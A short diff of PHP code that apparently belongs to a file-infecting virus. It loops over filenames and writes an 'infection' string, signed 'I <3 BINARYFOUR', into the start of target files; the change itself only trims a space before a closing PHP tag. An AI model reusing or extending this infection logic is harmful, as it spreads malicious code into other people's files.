@@ -334,7 +334,7 @@ foreach($filenames as $filename) {
         ."// I <3 BINARYFOUR\n"
         ."// Subscribe to PewDiePie!\n"
         ."\n"
-        ." ?>\n";
+        ."?>\n";
 
     // infection first
     fwrite($infected, $infection, strlen($infection));
